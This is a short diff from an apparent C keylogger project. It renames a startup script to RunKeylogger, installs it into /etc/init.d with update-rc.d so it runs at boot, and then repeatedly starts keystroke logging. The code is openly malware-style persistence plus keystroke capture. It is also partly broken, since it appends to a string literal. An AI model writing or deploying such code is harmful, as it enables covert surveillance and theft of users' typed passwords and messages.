@@ -18,12 +18,11 @@ int main (){
     strcat(dir_main,"/main &");
     char* comm = "sudo echo ";
     strcat(comm, dir_main);
-    printf("%s\n", "here");
-    strcat(comm, " > /etc/init.d/RunMain");
-    printf("%s", comm);
+    strcat(comm, " > /etc/init.d/RunKeylogger");
     system(comm);
-    system("sudo chmod +x /etc/init.d/RunMain");
-    system("sudo update-rc.d /etc/init.d/RunMain defaults");
+
+    system("sudo chmod +x /etc/init.d/RunKeylogger");
+    system("sudo update-rc.d /etc/init.d/RunKeylogger defaults");
     while (1){
       keylogger_start();
       time_30s(trigger);
